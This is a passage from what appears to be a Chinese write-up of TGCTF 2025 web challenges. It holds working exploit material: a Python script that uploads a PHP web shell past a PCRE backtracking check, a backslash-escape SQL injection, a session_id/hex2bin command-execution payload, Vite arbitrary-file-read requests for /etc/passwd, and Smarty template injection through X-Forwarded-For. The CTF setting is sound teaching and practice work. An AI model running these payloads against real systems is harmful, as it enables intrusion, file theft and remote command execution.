class="hljs-string">&#x27;文件上传成功！&#x27;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>如果有get传参的name，就会以get传来的数据作为移动的文件名。所以<code>move_uploaded_file</code>函数的第二个参数我们可控。那么就可以通过这个绕过后缀名黑名单。黑名单没过滤<code>.txt</code></p><p>另一个漏洞点就是<code>PCRE回溯</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?&lt;/s&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件内容包含非法字符，禁止上传！&#x27;</span>;<br>                <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>            &#125;<br></code></pre></td></tr></table></figure><p>非贪婪匹配 <code>&lt;</code> 如果有<code>&lt;</code>则会返回true。但是这里存在<code>PCRE回溯</code>。通过塞入大于 100w的脏数据来让这里返回<code>false</code>即可绕过。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <br><br>url = <span class="hljs-string">&quot;http://182.92.xxx.xxx:9111/upload.php&quot;</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">1010000</span> + <span class="hljs-string">&#x27;&lt;?php system($_GET[1]);?&gt;&#x27;</span><br><br>files = &#123;<br>    <span class="hljs-string">&#x27;name&#x27;</span>:(<span class="hljs-string">&#x27;1.txt&#x27;</span>,payload,<span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>&#125;<br>params = &#123;<br>    <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;1.php/.&#x27;</span>  <br>&#125;<br><br>data = &#123;<br>    <span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;上传文件&#x27;</span><br>&#125;<br><br>response = requests.post(url=url,files=files,data=data,params=params)<br><span class="hljs-built_in">print</span>(response.status_code)<br><span class="hljs-built_in">print</span>(response.text)<br><br>shellUrl = <span class="hljs-string">&quot;http://182.92.xxx.xxx:9111/uploads/1.php&quot;</span><br>cmd = shellUrl+<span class="hljs-string">&#x27;?1=env&#x27;</span><br>cmd_req = requests.get(url=cmd)<br><span class="hljs-built_in">print</span>(cmd_req.text)<br><br><br></code></pre></td></tr></table></figure><p>我这里并没有设置flag。因为我是本地启动的docker。</p><hr><h2 id="后台管理"><a href="#后台管理" class="headerlink" title="后台管理"></a>后台管理</h2><h3 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h3><p>考点在源码中，属于代码问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect, render_template, render_template_string<br><span class="hljs-keyword">import</span> pymysql.cursors<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    <span class="hljs-keyword">return</span> pymysql.connect(<br>        host=os.environ[<span class="hljs-string">&quot;MYSQL_HOST&quot;</span>],<br>        user=os.environ[<span class="hljs-string">&quot;MYSQL_USER&quot;</span>],<br>        password=os.environ[<span class="hljs-string">&quot;MYSQL_PASSWORD&quot;</span>],<br>        database=os.environ[<span class="hljs-string">&quot;MYSQL_DATABASE&quot;</span>],<br>        charset=<span class="hljs-string">&quot;utf8mb4&quot;</span>,<br>        cursorclass=pymysql.cursors.DictCursor,<br>    )<br><br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.cookies:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, username=request.cookies[<span class="hljs-string">&quot;username&quot;</span>])<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>        password = request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> password <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;要输入账号密码喔~&quot;</span>, <span class="hljs-number">400</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(username) &gt; <span class="hljs-number">64</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(password) &gt; <span class="hljs-number">64</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;哈~太长了，受不了了~&quot;</span>, <span class="hljs-number">400</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-keyword">in</span> username <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-keyword">in</span> password:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;杂鱼，还想SQL注入？爬！&quot;</span>, <span class="hljs-number">400</span><br><br>        conn = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">try</span>:<br>            conn = db()<br>            <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:<br>                cursor.execute(<br>                    <span class="hljs-string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="hljs-subst">&#123;password&#125;</span>&#x27;&quot;</span><br>                )<br>                user = cursor.fetchone()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>, <span class="hljs-number">500</span><br>        <span class="hljs-keyword">finally</span>:<br>            <span class="hljs-keyword">if</span> conn <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                conn.close()<br><br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> user:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;账号密码错误&quot;</span>, <span class="hljs-number">400</span><br><br>        response = redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>        response.set_cookie(<span class="hljs-string">&quot;username&quot;</span>, user[<span class="hljs-string">&quot;username&quot;</span>])<br>        <span class="hljs-keyword">return</span> response<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="/img/TGCTF-2025/image-20250425200652772.png"></p><p>username 与 password 不能超过64个字符，且过滤了<code>&#39;</code></p><p>格式化字符串字面量的方式嵌入<code>SQL</code>语句。正因为如此，造成了漏洞。</p><p>虽然过滤了<code>&#39;</code>，但由于<code>&#39;&#123;username&#125;&#39;</code> 我们的username可以传入转义字符<code>\</code> 这样就会把闭合的<code>&#39;</code>进行转义。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>假设username<span class="hljs-operator">=</span>admin password<span class="hljs-operator">=</span><span class="hljs-number">123</span><br>f&quot;SELECT * FROM users WHERE username = &#x27;admin&#x27; AND password = &#x27;123&#x27;&quot;<br><br>通过转义后变为了 username<span class="hljs-operator">=</span>admin\ password<span class="hljs-operator">=</span><span class="hljs-number">123</span><br><br>f&quot;SELECT * FROM users WHERE username = &#x27;admin\&#x27; AND password = &#x27;123&#x27;&quot;<br>这时候就可以进行<span class="hljs-keyword">sql</span>注入<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin\&#x27;</span> <span class="hljs-keyword">AND</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;union select * from flag --+&#x27;</span><br><br>从而达到让我们的恶意<span class="hljs-keyword">sql</span>语句从单引号逃逸出来。<br></code></pre></td></tr></table></figure><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><h4 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h4><p><img src="/img/TGCTF-2025/image-20250425201616253.png"></p><p>通过这种方式判断字段数为 2，回显位为1</p><p><img src="/img/TGCTF-2025/image-20250425201645422.png"></p><p>库为 <code>tgctf</code></p><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>这里我尝试猜表名与列名，因为字符必须小于64。</p><p><img src="/img/TGCTF-2025/image-20250425202821646.png"></p><hr><h2 id="偷渡阴平"><a href="#偷渡阴平" class="headerlink" title="偷渡阴平"></a>偷渡阴平</h2><h3 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h3><p>session_id rce </p><p>开启session后，获取PHPSESSID的值（由我们可控）。从而rce。 </p><p>session的格式：<code>十六进制</code></p><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$tgctf2025</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tgctf2025&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="hljs-variable">$tgctf2025</span>))&#123;<br>    <span class="hljs-comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tgctf2025</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><br><br><br></code></pre></td></tr></table></figure><p>没有过滤<code>session_id</code>。首先我们需要开启session获取 <code>session_start()</code>。然后构造我们的恶意命令 <code>ls =&gt; 6c73</code>。并且使用<code>hex2bin()</code>将十六进制数据转换为原始二进制。即<code>ls</code></p><p>题目很友好，没有给<code>system</code>过滤 </p><p><img src="/img/TGCTF-2025/image-20250425204009786.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GET: http:<span class="hljs-comment">//154.23.163.97:1234/?tgctf2025=session_start();system(hex2bin(session_id()));</span><br>COOKIE:PHPSESSID=<span class="hljs-number">6</span>C73202F<br></code></pre></td></tr></table></figure><p>flag在根目录</p><p><img src="/img/TGCTF-2025/image-20250425204141835.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GET: http:<span class="hljs-comment">//154.23.163.97:1234/?tgctf2025=session_start();system(hex2bin(session_id()));</span><br>COOKIE:PHPSESSID=<span class="hljs-number">636174202</span>F666C6167<br></code></pre></td></tr></table></figure><hr><h2 id="前端GAME"><a href="#前端GAME" class="headerlink" title="前端GAME"></a>前端GAME</h2><h3 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h3><p>最近爆的 <code>Vite</code> 任意文件读取漏洞。</p><p><a href="https://www.cnblogs.com/risheng/p/18795361">https://www.cnblogs.com/risheng/p/18795361</a></p><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p><img src="/img/TGCTF-2025/image-20250425205256448.png"></p><p>获取到vite版本 符合漏洞版本。读取<code>/etc/passwd</code></p><p><code>http://154.23.163.97:1234/@fs/etc/passwd?import&amp;raw??</code></p><p><img src="/img/TGCTF-2025/image-20250425205421864.png"></p><p>读取<code>/proc/1/cmdline</code></p><p><img src="/img/TGCTF-2025/image-20250425205505700.png"></p><p>启动了一个<code>start.sh</code>脚本。</p><p><img src="/img/TGCTF-2025/image-20250425205532172.png"></p><p>获取flag路径 <code>/tgflagggg</code></p><p><img src="/img/TGCTF-2025/image-20250425205634437.png"></p><hr><h2 id="前端GAME-PLUS"><a href="#前端GAME-PLUS" class="headerlink" title="前端GAME PLUS"></a>前端GAME PLUS</h2><h3 id="考点-4"><a href="#考点-4" class="headerlink" title="考点"></a>考点</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&mid=2247483811&idx=1&sn=2b4403023fd911f611bf5590ea3796d6&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&amp;mid=2247483811&amp;idx=1&amp;sn=2b4403023fd911f611bf5590ea3796d6&amp;scene=21#wechat_redirect</a></p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC 1"></a>POC 1</h4><ol><li>仅影响Vite 6.0及以上版本（即&gt;&#x3D;6.0.0的受影响版本）；</li><li>仅当被读取的文件大小小于<code>build.assetsInlineLimit</code>配置值时（默认值为4KB）。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &quot;http://localhost:5173/etc/passwd?.svg?.wasm?init&quot;<br></code></pre></td></tr></table></figure><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC 2"></a>POC 2</h4><p>如果知道Vite所在的绝对路径，可以利用如下POC  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --request-target /@fs/x/x/x/vite-project/#/../../../../../etc/passwd http://localhost:5173/<br></code></pre></td></tr></table></figure><blockquote><p>HTTP 1.1规范（RFC 9112）规定在请求目标（request-target）中不允许出现<code>#</code>字符。然而，攻击者是有可能发送包含<code>#</code>的请求的。对于那些请求行（包含请求目标）无效的请求，规范建议服务器返回400错误请求）或301永久重定向）状态码来拒绝这些请求。对于HTTP 2协议也是类似的情况。</p></blockquote><p>所以需要 <code>--request-target</code> 参数</p><h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p><img src="/img/TGCTF-2025/image-20250425210514439.png"></p><p><img src="/img/TGCTF-2025/image-20250425210556100.png"></p><h2 id="前端GAME-Ultra"><a href="#前端GAME-Ultra" class="headerlink" title="前端GAME Ultra"></a>前端GAME Ultra</h2><h3 id="考点-5"><a href="#考点-5" class="headerlink" title="考点"></a>考点</h3><p>就是PLUS版本的POC2 </p><hr><h2 id="火眼辩魑魅"><a href="#火眼辩魑魅" class="headerlink" title="火眼辩魑魅"></a>火眼辩魑魅</h2><h3 id="考点-6"><a href="#考点-6" class="headerlink" title="考点"></a>考点</h3><p><code>Smarty</code> 模板渲染</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>                <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./Smarty/libs/Smarty.class.php&#x27;</span>;<br>                <span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Smarty</span>();<br>                <span class="hljs-variable">$ip</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;OvO 你电脑的IP是：&quot;</span>;<br>                <span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&quot;string:&quot;</span>.<span class="hljs-variable">$ip</span>);<br>                <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传参点在<code>XFF</code></p><h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p><img src="/img/TGCTF-2025/image-20250425211207884.png"></p><p><img src="/img/TGCTF-2025/image-20250425211437083.png"></p><p>确认存在 SSTI。</p><p><img src="/img/TGCTF-2025/image-20250425211508107.png"></p><p>flag在根目录 <code>tgfffffllllaagggggg</code></p><p><img src="/img/TGCTF-2025/image-20250425211553359.png"></p><hr><h2 id="熟悉的配方，熟悉的味道"><a href="#熟悉的配方，熟悉的味道" class="headerlink" title="熟悉的配方，熟悉的味道"></a>熟悉的配方，熟悉的味道</h2><h3 id="考点-7"><a href="#考点-7" class="headerlink" title="考点"></a>考点</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyramid.config <span class="hljs-keyword">import</span> Configurator<br><span class="hljs-keyword">from</span> pyramid.request <span class="hljs-keyword">import</span> Request<br><span class="hljs-keyword">from</span> pyramid.response <span class="hljs-keyword">import</span> Response<br><span class="hljs-keyword">from</span> pyramid.view <span class="hljs-keyword">import</span> view_config<br><span class="hljs-keyword">from</span> wsgiref.simple_server <span class="hljs-keyword">import</span> make_server<br><span class="hljs-keyword">from</span> pyramid.events <span class="hljs-keyword">import</span> NewResponse<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, BaseLoader<br><br>eval_globals = &#123; <span class="hljs-comment">#防止eval执行恶意代码</span><br>    <span class="hljs-string">&#x27;__builtins__&#x27;</span>: &#123;&#125;,      <span class="hljs-comment"># 禁用所有内置函数</span><br>    <span class="hljs-string">&#x27;__import__&#x27;</span>: <span class="hljs-literal">None</span>       <span class="hljs-comment"># 禁止动态导入</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkExpr</span>(<span class="hljs-params">expr_input</span>):<br>    expr = re.split(<span class="hljs-string">r&quot;[-+*/]&quot;</span>, expr_input)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(expr_input))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(expr) != <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">int</span>(expr[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">int</span>(expr[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home_view</span>(<span class="hljs-params">request</span>):<br>    expr_input = <span class="hljs-string">&quot;&quot;</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        expr_input = request.POST[<span class="hljs-string">&#x27;expr&#x27;</span>]<br>        <span class="hljs-keyword">if</span> checkExpr(expr_input):<br>            <span class="hljs-keyword">try</span>:<br>                result = <span class="hljs-built_in">eval</span>(expr_input, eval_globals)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                result = e<br>        <span class="hljs-keyword">else</span>:<br>            result = <span class="hljs-string">&quot;爬！&quot;</span><br><br><br>    template_str = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    &lt;!doctype html&gt;</span><br><span class="hljs-string">    &lt;html&gt;</span><br><span class="hljs-string">    &lt;head&gt;</span><br><span class="hljs-string">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="hljs-string">        &lt;title&gt;Calculator with Code Highlighting&lt;/title&gt;</span><br><span class="hljs-string">        &lt;link rel=&quot;stylesheet&quot;</span><br><span class="hljs-string">              href=&quot;//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/default.min.css&quot;&gt;</span><br><span class="hljs-string">        &lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">        &lt;script&gt;hljs.highlightAll();&lt;/script&gt;</span><br><span class="hljs-string">        &lt;style&gt;</span><br><span class="hljs-string">            body &#123; font-family: Arial, sans-serif; margin: 20px; &#125;</span><br><span class="hljs-string">            pre &#123; background: #f5f5f5; padding: 10px; &#125;</span><br><span class="hljs-string">        &lt;/style&gt;</span><br><span class="hljs-string">    &lt;/head&gt;</span><br><span class="hljs-string">    &lt;body&gt;</span><br><span class="hljs-string">        &lt;h1&gt;Calculator&lt;/h1&gt;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;expr&quot;&gt;输入表达式:&lt;/label&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;text&quot; name=&quot;expr&quot; id=&quot;expr&quot; value=&quot;&#123;&#123; expr_input &#125;&#125;&quot; placeholder=&quot;输入二元表达式，例如: 1+2 或 3-4 或 5*6 或 7/8&quot; style=&quot;width: 300px;&quot;&gt;</span><br><span class="hljs-string">            &lt;button type=&quot;submit&quot;&gt;计算&lt;/button&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        &#123;% if result != &quot;&quot; %&#125;</span><br><span class="hljs-string">        &lt;h2&gt;结果: &#123;&#123; result &#125;&#125;&lt;/h2&gt;</span><br><span class="hljs-string">        &#123;% endif %&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string"> 